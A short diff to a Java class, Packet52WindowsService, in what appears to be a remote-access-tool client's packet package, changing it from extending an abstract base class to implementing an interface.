@@ -3,7 +3,7 @@ package jrat.client.packets.outgoing;
 import jrat.client.Connection;
 
 
-public class Packet52WindowsService extends AbstractOutgoingPacket {
+public class Packet52WindowsService implements OutgoingPacket {
 
 	private String name;
 
